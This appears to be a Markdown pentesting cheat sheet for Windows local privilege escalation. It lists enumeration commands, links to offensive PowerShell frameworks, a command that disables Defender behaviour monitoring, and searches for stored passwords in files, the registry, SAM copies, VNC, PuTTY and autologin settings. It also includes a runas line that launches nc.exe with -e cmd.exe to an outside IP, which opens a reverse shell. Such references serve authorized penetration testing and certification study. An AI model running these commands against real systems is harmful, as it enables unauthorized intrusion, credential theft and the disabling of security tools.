# Windows Privilege Escalation

- [Windows Privilege Escalation](#windows-privilege-escalation)
	- [Powershell module](#powershell-module)
	- [Usefull Command - MSF](#usefull-command---msf)
	- [Usefull Command - Windows](#usefull-command---windows)
	- [Powershell history](#powershell-history)
	- [Clipboard](#clipboard)
	- [Permissions](#permissions)
	- [Credential Manager](#credential-manager)
	- [AV](#av)
	- [Firewall](#firewall)
	- [Network](#network)
	- [Software](#software)
	- [Auto Start](#auto-start)
		- [Scheduled Tasks](#scheduled-tasks)
	- [Weak Service Permissions](#weak-service-permissions)
	- [Unquoted Service Path](#unquoted-service-path)
	- [AlwaysInstallElevated << IF 64 bits use:  %SystemRoot%\Sysnative\reg.exe](#alwaysinstallelevated--if-64-bits-use--systemrootsysnativeregexe)
	- [Service only available from inside](#service-only-available-from-inside)
	- [Pasword in files](#pasword-in-files)
	- [VNC](#vnc)
	- [Windows autologin](#windows-autologin)
	- [SNMP Paramters](#snmp-paramters)
	- [Putty](#putty)
	- [Search for password in registry](#search-for-password-in-registry)
- [Source](#source)


> DOC: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation

## Powershell module

	https://github.com/samratashok/nishang
	https://github.com/PowerShellMafia/PowerSploit
	https://github.com/EmpireProject/Empire/tree/master/data/module_source/credentials

## Usefull Command - MSF

	sysinfo

	getuid

	run post/windows/gather/win_privs

## Usefull Command - Windows 

	systeminfo  
	wmic qfe get Caption,Description,HotFixID,InstalledOn  

	whoami  
	whoami /all
	echo %USERNAME%  

	net user  
	net localgroup  

	net user /domain  

	net group /domain  
	net group /domain <Group Name>  

> Default user priv 

    Privilege Name                Description                          State
    ============================= ==================================== ========
    SeShutdownPrivilege           Shut down the system                 Disabled
    SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
    SeUndockPrivilege             Remove computer from docking station Disabled
    SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
    SeTimeZonePrivilege           Change the time zone                 Disabled
## Powershell history 
```powershell
type C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type %appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

cat (Get-PSReadlineOption).HistorySavePath
```
## Clipboard
```powershell
powershell -command "Get-Clipboard"
```
## Permissions

> Simple right

	F (full access)
	M (modify access)
	RX (read and execute access)
	R (read-only access)
	W (write-only access)

> Read permission

```
icacls FILE_OR_DIR
```

> Set Permissions
```
icacls "FILE_OR_DIR" /grant USERNAME:PERMISSIONS
```
> Set Full Permissions
```
icacls "FILE_OR_DIR" /grant USERNAME:F
```
## Credential Manager

If there are entries, it means that we may able to runas certain user who stored his cred in windows

	powershell cmdkey /list 
	dir C:\Users\username\AppData\Local\Microsoft\Credentials\
	dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\

## AV

Status of defender : `sc query windefend `
Disable defender: 
```powershell
Set-MpPreference -DisableBehaviorMonitoring $true
```
Enable  defender:
```powershell
Set-MpPreference -DisableBehaviorMonitoring $false
```

> Others 

```
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more 
```


## Firewall  
	netsh firewall show state  
	netsh firewall show config  

## Network  
	ipconfig /all  
	route print  
	arp -A  

## Software
```powershell
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
## Auto Start

	wmic startup get caption,command 

	reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
	reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

### Scheduled Tasks  
```powershell
schtasks /query /fo LIST /v  > schtask.txt 
type schtask.txt | findstr "Task To Run:"


cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM  
```
dir %SystemRoot%\Tasks  

	e.g. c:\windows\tasks\  
	e.g. c:\windows\system32\tasks\  

## Weak Service Permissions  
Check service config can be modify or not  
```powershell
accesschk.exe /accepteula  
accesschk.exe -uwcqv "Authenticated Users" * /accepteula  
accesschk.exe -ucqv \<Service Name>  

sc qc \<Service Name> -- Get service details  

Check service with weak file permission  
User c:\windows\temp\  
```
wmic.exe  
```powershell
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"  
```
sc.exe
```powershell
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt  
FOR /F %i in (Servicenames.txt) DO echo %i  
type Servicenames.txt  
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt  
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt  
```
## Unquoted Service Path  
```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """  
```
```
sc query  
sc qc service name  
```


## AlwaysInstallElevated << IF 64 bits use:  %SystemRoot%\Sysnative\reg.exe  
	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  
	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  

## Service only available from inside  
```powershell
netstat -ano  
upload plink.exe  

plink.exe -R "remote port":127.0.0.1:"local port"  root@"ipaddress"
```

## Pasword in files  
https://pentestlab.blog/tag/privilege-escalation/page/3/ 

```powershell
cmdkey /list
runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \\IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"  
```
Can we find any SAM files?  

	%SYSTEMROOT%\repair\SAM  
	%SYSTEMROOT%\System32\config\RegBack\SAM  
	%SYSTEMROOT%\System32\config\SAM  
	%SYSTEMROOT%\repair\system  
	%SYSTEMROOT%\System32\config\SYSTEM  
	%SYSTEMROOT%\System32\config\RegBack\system  

findstr Extentions 
```powershell
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
findstr /si pass/pwd *.ini  
findstr /si pass/pwd *.conf 
```
dir /s *pass* == *cred* == *vnc* == *.config*  

in all files  
```powershell
findstr /spin "password" *.*  
findstr /spin "password" *.*  
```
Unattended? vnc?  
```powershell
c:\sysprep.inf  
c:\sysprep\sysprep.xml  
c:\unattend.xml  
%WINDIR%\Panther\Unattend\Unattended.xml  
%WINDIR%\Panther\Unattended.xml  

dir /b /s unattend.xml  
dir /b /s web.config  
dir /b /s sysprep.inf  
dir /b /s sysprep.xml  
dir /b /s *pass*  
dir /b /s *.kdbx
```
> OR

```powershell
Get-Childitem -Recurse -ErrorAction SilentlyContinue -Include *.kdbx,*pass*,unattend.xml,web.config,sysprep.inf,sysprep.xml
```

vnc
```powershell
dir c:\*vnc.ini /s /b  
dir c:\*ultravnc.ini /s /b   
dir c:\ /s /b | findstr /si *vnc.ini  
```
## VNC  
```powershell
reg query "HKCU\Software\ORL\WinVNC3\Password"  
reg query "HKCU\Software\TightVNC\Server"  
```
## Windows autologin  
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
```
## SNMP Paramters  
```powershell
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  
```
## Putty 
```powershell
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  
```
## Search for password in registry  
	reg query HKLM /f password /t REG_SZ /s  
	reg query HKCU /f password /t REG_SZ /s  


# Source 

- https://raw.githubusercontent.com/xMilkPowderx/OSCP/master/Windows%20Priv%20Esc.md
- https://0xsp.com/ad-attack-or-defense/ad-ttps-list

